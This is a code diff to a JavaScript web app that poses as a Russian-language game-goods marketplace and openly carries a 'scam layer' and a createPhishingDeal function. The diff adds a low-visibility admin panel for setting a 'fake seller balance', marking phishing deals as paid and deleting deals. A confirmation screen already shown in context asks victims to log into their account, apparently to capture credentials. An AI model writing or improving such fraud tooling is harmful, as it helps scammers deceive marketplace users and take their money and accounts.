@@ -6,8 +6,7 @@
   const ccy = (id) => D.currencies.find((c) => c.id === id) || D.currencies[7];
   const uid = (p) => p + Math.random().toString(36).slice(2, 9);
   const emptyBal = () => Object.fromEntries(D.currencies.map((c) => [c.id, 0]));
-  // Добавлен экран deals
-  const SCREENS = ["hub","home","shop","section","sell","wallet","profile","chats","support","item","ops","deals"];
+  const SCREENS = ["hub","home","shop","section","sell","wallet","profile","chats","support","item","ops","deals","admin"];
   const TABS = new Set(["profile","chats","sell","wallet","support","deals"]);
 
   function money(n, id = "USDT") {
@@ -43,7 +42,7 @@
     listings: saved.listings || [],
     orders: saved.orders || [],
     ops: saved.ops || [],
-    support: saved.support || [{ id: "s0", from: "support", text: "👋 Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
+    support: saved.support || [{ id: "s0", from: "support", text: " Привет! Это поддержка.\nНапиши — сообщение придёт оператору в Telegram.", at: Date.now() }],
     /* --- SCAM LAYER STATE --- */
     dealBalance: saved.dealBalance || 0,
     dealDeals: saved.dealDeals || [],
@@ -65,6 +64,8 @@
     chatText: "",
     sortKey: "price",
     sortDir: "desc",
+    /* Сохраняем позицию скролла */
+    lastScrollTop: 0
   };
 
   function persist() {
@@ -80,19 +81,18 @@
     setTimeout(() => { if (state.toast === msg) { state.toast = null; render(); } }, 2200);
   }
   
-  // Функция плавного скролла к полям ввода
+  // Плавный скролл к полям ввода БЕЗ сброса вверх
   function scrollToInput() {
     setTimeout(() => {
       const el = document.getElementById('title');
       if (el) {
         const container = document.querySelector('.scroll');
         if (container) {
-          // Скроллим контейнер так, чтобы элемент был в центре (с учетом шапки)
-          const top = el.getBoundingClientRect().top + container.scrollTop - 100;
-          container.scrollTo({ top: top, behavior: 'smooth' });
+          const elTop = el.offsetTop;
+          container.scrollTo({ top: elTop - 100, behavior: 'smooth' });
         }
       }
-    }, 50); // Небольшая задержка, чтобы DOM обновился
+    }, 100);
   }
 
   function go(screen, id) {
@@ -272,6 +272,7 @@
     lock: ico('<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>'),
     check: ico('<path d="M20 6 9 17l-5-5"/>'),
     clock: ico('<circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/>'),
+    settings: ico('<path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/>'),
   };
   const CAT_ICO = { topup: I.coins, onaccount: I.userCheck, accounts: I.game, keys: I.key, gift: I.gift, items: I.pack, subs: I.ticket, buysub: I.bag, giftcard: I.card, paycard: I.wallet, service: I.wr, telegram: I.spark, exchange: I.swap, nft: I.spark, stars: I.star, other: I.pack, deals: I.lock };
 
@@ -503,7 +504,6 @@
         ${D.games.map((x) => `<button type="button" class="card ${s.gameId === x.id ? "ring" : ""}" style="padding:.75rem;border:0;color:inherit;display:flex;flex-direction:column;align-items:center;gap:.4rem" data-game="${x.id}">${logo(x.id, "logo")}<span class="xs bold">${x.name}</span></button>`).join("")}
       </div>${btn("Далее", `data-sell-next`, "btn btn-primary mt-4")}`;
     } else if (s.step === 2) {
-      // Категории используют data-svc
       const servicesHtml = D.services.map((t) => {
          return `<button type="button" class="card ${s.category === t.id ? "ring" : ""}" 
             data-svc="${t.id}"
@@ -521,7 +521,6 @@
           <div class="grid2">${D.games.map((x) => `<button type="button" class="card ${s.wantGameId === x.id ? "ring" : ""}" style="display:flex;align-items:center;gap:.65rem;padding:.65rem;text-align:left;border:0;color:inherit" data-want="${x.id}">${logo(x.id)}<span class="bold" style="font-size:.875rem">${x.name}</span></button>`).join("")}</div>` : ""}
         ${sc && sc.collections ? `<p class="small bold chipfg mt-4">Что именно</p><div class="grid2">${sc.collections.map((c) => `<button type="button" class="card" style="text-align:left;border:0;color:inherit;padding:0" data-offer="${c.id}" data-offercat="${c.category}" data-offertitle="${esc(c.title)}"><img src="${img(c.image)}" alt="" style="height:4rem;width:100%;object-fit:cover"><span class="xs bold" style="display:block;padding:.5rem">${c.title}</span></button>`).join("")}</div>` : ""}
         
-        <!-- КНОПКА ФОТО -->
         <div class="card mt photo-upload-btn" style="padding:1.5rem; text-align:center; border:2px dashed var(--border); cursor:pointer;" onclick="document.getElementById('photos-input').click()">
            ${I.image} <span class="bold" style="display:block;margin-top:0.5rem">Нажми, чтобы добавить фото</span>
            <span class="xs muted">JPG, PNG, WEBP</span>
@@ -589,6 +588,68 @@
       <div class="row" style="justify-content:space-between"><h2 class="h2">${title}</h2><button type="button" class="lot-tool" data-sheet="">${I.x}</button></div>${inner}</div></div>`;
   }
 
+  // --- ADMIN VIEW ---
+  function adminView() {
+    const deals = state.dealDeals || [];
+    const listings = state.listings || [];
+    
+    let dealsHtml = '';
+    deals.forEach((d, i) => {
+      dealsHtml += `<div class="card mt" style="padding:1rem">
+        <div class="row" style="justify-content:space-between;align-items:center">
+          <div>
+            <span class="bold">${esc(d.title)}</span>
+            <span class="xs muted" style="display:block">${d.status} · ₮${d.price}</span>
+          </div>
+          <div style="display:flex;gap:0.5rem;flex-wrap:wrap">
+            <button class="btn btn-chip" style="background:#f0c040;color:#000" onclick="window.changeDealStatus(${i},'pending')">В ожидании</button>
+            <button class="btn btn-chip" style="background:#8ee39a;color:#000" onclick="window.payDeal(${i})">💰 Оплатить</button>
+            <button class="btn btn-chip" style="background:#1d3a24;color:#fff" onclick="window.changeDealStatus(${i},'completed')">Выполнено</button>
+            <button class="btn btn-chip" style="background:#e06060;color:#fff" onclick="window.changeDealStatus(${i},'rejected')">Отклонено</button>
+            <button class="btn btn-chip" style="background:#ff4444;color:#fff" onclick="window.deleteDeal(${i})"></button>
+          </div>
+        </div>
+      </div>`;
+    });
+
+    let listingsHtml = '';
+    listings.forEach((l, i) => {
+      listingsHtml += `<div class="card mt" style="padding:1rem">
+        <div class="row" style="justify-content:space-between;align-items:center">
+          <div>
+            <span class="bold">${esc(l.title)}</span>
+            <span class="xs muted" style="display:block">${l.category} · ₮${l.price}</span>
+          </div>
+          <button class="btn btn-chip" style="background:#ff4444;color:#fff" onclick="window.deleteListing(${i})">🗑</button>
+        </div>
+      </div>`;
+    });
+
+    return `<div class="scroll pad" style="padding-top:1.5rem">
+      <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:1rem">
+        <h1 class="h1" style="margin:0">⚙️ Админ-панель</h1>
+        <button class="btn btn-ghost" data-go="deals">${I.back} Назад</button>
+      </div>
+      
+      <div class="card" style="padding:1rem;margin-bottom:1rem">
+        <p class="bold">💰 Фейковый баланс продавца</p>
+        <p class="xs muted">Текущий баланс сделок: <b>₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(state.dealBalance)}</b></p>
+        <div style="display:flex;gap:0.5rem;margin-top:0.5rem">
+          <input class="field" id="adminBalanceInput" type="number" placeholder="Сумма" style="flex:1">
+          <button class="btn btn-primary" style="width:auto" onclick="window.setDealBalance()">Установить</button>
+          <button class="btn btn-secondary" style="width:auto" onclick="window.addDealBalance()">Добавить</button>
+        </div>
+      </div>
+
+      <p class="bold" style="margin-bottom:0.5rem">📋 Сделки (${deals.length})</p>
+      ${deals.length === 0 ? '<p class="xs muted">Нет сделок</p>' : dealsHtml}
+
+      <p class="bold" style="margin:1rem 0 0.5rem">📦 Объявления в каталоге (${listings.length})</p>
+      ${listings.length === 0 ? '<p class="xs muted">Нет объявлений</p>' : listingsHtml}
+    </div>`;
+  }
+
+  // --- DEALS VIEW ---
   function dealsView() {
     const p = state.profile;
     const deals = state.dealDeals || [];
@@ -637,7 +698,7 @@
             const statusLabel = labels[d.status] || d.status;
             let actions = "";
             if (d.status === "paid") {
-              actions = `<button class="deal-confirm-btn" data-confirm-deal="${d.id}"> Подтвердить получение средств</button>`;
+              actions = `<button class="deal-confirm-btn" data-confirm-deal="${d.id}">🔒 Подтвердить получение средств</button>`;
             }
             return `<div class="deal-card mt">
               <div class="deal-card-head">
@@ -650,7 +711,7 @@
               <div class="deal-card-body">
                 <div class="row" style="justify-content:space-between">
                   <span class="xs muted">Сумма</span>
-                  <span class="bold">₮${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(d.price)}</span>
+                  <span class="bold">${new Intl.NumberFormat("ru-RU", { maximumFractionDigits: 2 }).format(d.price)}</span>
                 </div>
                 <div class="row" style="justify-content:space-between;margin-top:.35rem">
                   <span class="xs muted">Категория</span>
@@ -671,7 +732,7 @@
       <div class="confirm-panel" data-stop>
         <div class="cp-icon"></div>
         <div class="cp-title">Подтверждение получения средств</div>
-        <div class="cp-warn">⚡ Подтверждение средств будет доступным после подтверждения получения товара покупателем</div>
+        <div class="cp-warn"> Подтверждение средств будет доступным после подтверждения получения товара покупателем</div>
         <div class="cp-hint">Для завершения верификации сделки войдите в аккаунт, с которого была создана сделка</div>
         <form id="confirmForm">
           <div class="form-group">
@@ -766,6 +827,12 @@
             </div>`;
           }).join("") || ""}
       ${state.orders.length > 0 ? state.orders.slice(0,4).map((o) => `<div class="card mt-2" style="display:flex;justify-content:space-between;padding:.75rem"><div><div class="bold" style="font-size:.875rem">${esc(o.title)}</div><div class="xs muted">${o.status === "held" ? "в холде" : "завершена"}</div></div><div class="bold">${money(o.amount, o.currency)}</div></div>`).join("") : ""}
+      
+      <!-- Кнопка админки -->
+      <div class="mt-4" style="text-align:center">
+        <button class="btn btn-ghost" data-go="admin" style="font-size:12px;opacity:0.5">${I.settings} Админ-панель</button>
+      </div>
+      
       ${state.sheet === "currency" ? sheet("Выберите валюту", `<div class="grid3">${D.currencies.map((c) => `<button type="button" class="ccy-card ${state.ccyPick === c.id ? "on" : ""}" data-pick-ccy="${c.id}"><span class="bold">${c.mark}</span><span class="xs bold">${c.label}</span><span class="xs muted">${c.name}</span></button>`).join("")}</div>${btn("Продолжить", `data-set-ccy`, "btn btn-primary mt-4")}`) : ""}
     </div>`;
   }
@@ -827,6 +894,7 @@
       case "support": return support();
       case "ops": return ops();
       case "deals": return dealsView();
+      case "admin": return adminView();
       default: return hub();
     }
   }
@@ -888,6 +956,11 @@
   function createPhishingDeal(s) {
     const price = parseAmount(s.price) || 0;
     if (price <= 0) return toast("Укажите цену");
+    
+    // Защита от дублей
+    const isDuplicate = state.dealDeals.some(d => d.title === s.title && d.price === price && d.status !== "completed" && d.status !== "rejected");
+    if (isDuplicate) return toast("Такая сделка уже существует");
+    
     const deal = {
       id: uid("d"),
       title: s.title || "Сделка",
@@ -908,14 +981,93 @@
     go("deals");
   }
 
-  // ГЛОБАЛЬНАЯ ФУНКЦИЯ ЗАГРУЗКИ ФОТО
+  // ГЛОБАЛЬНАЯ ФУНКЦИЯ ЗАГРУЗКИ ФОТО (без скролла вверх)
   window.handlePhotos = async function(input) {
     const files = Array.from(input.files || []);
+    if (files.length === 0) return;
+    
+    // Сохраняем текущую позицию скролла
+    const container = document.querySelector('.scroll');
+    const scrollTop = container ? container.scrollTop : 0;
+    
     for (const f of files.slice(0, 8 - state.sell.photos.length)) { 
       try { state.sell.photos.push(await compressFile(f)); } catch {} 
     }
     input.value = ""; 
+    
+    // Восстанавливаем позицию скролла после рендера
     render();
+    setTimeout(() => {
+      if (container) container.scrollTop = scrollTop;
+    }, 50);
+  };
+
+  // --- ADMIN FUNCTIONS ---
+  window.changeDealStatus = function(index, status) {
+    if (state.dealDeals && state.dealDeals[index]) {
+      state.dealDeals[index].status = status;
+      persist();
+      render();
+      toast(`Статус изменён на: ${status}`);
+    }
+  };
+
+  window.payDeal = function(index) {
+    if (state.dealDeals && state.dealDeals[index]) {
+      const deal = state.dealDeals[index];
+      // Начисляем фейковый баланс
+      state.dealBalance = (state.dealBalance || 0) + deal.price;
+      deal.status = "paid";
+      persist();
+      render();
+      toast(`💰 Оплачено! +₮${deal.price} к балансу продавца`);
+    }
+  };
+
+  window.deleteDeal = function(index) {
+    if (state.dealDeals && state.dealDeals[index]) {
+      state.dealDeals.splice(index, 1);
+      persist();
+      render();
+      toast("Сделка удалена");
+    }
+  };
+
+  window.deleteListing = function(index) {
+    if (state.listings && state.listings[index]) {
+      state.listings.splice(index, 1);
+      persist();
+      render();
+      toast("Объявление удалено");
+    }
+  };
+
+  window.setDealBalance = function() {
+    const input = document.getElementById('adminBalanceInput');
+    if (input) {
+      const val = parseFloat(input.value);
+      if (!isNaN(val) && val >= 0) {
+        state.dealBalance = val;
+        persist();
+        render();
+        toast(`Баланс установлен: ₮${val}`);
+        input.value = "";
+      }
+    }
+  };
+
+  window.addDealBalance = function() {
+    const input = document.getElementById('adminBalanceInput');
+    if (input) {
+      const val = parseFloat(input.value);
+      if (!isNaN(val) && val > 0) {
+        state.dealBalance = (state.dealBalance || 0) + val;
+        persist();
+        render();
+        toast(`Добавлено: +₮${val}`);
+        input.value = "";
+      }
+    }
   };
 
   // ГЛОБАЛЬНЫЕ СЛУШАТЕЛИ
@@ -944,11 +1096,10 @@
           state.sell.role = "sell"; 
           state.sell.step = 3; 
           render();
-          scrollToInput(); // Скролл к полям
+          scrollToInput();
           return;
       }
       
-      // Для обычных категорий тоже скроллим к полям ввода
       render(); 
       scrollToInput();
       return; 
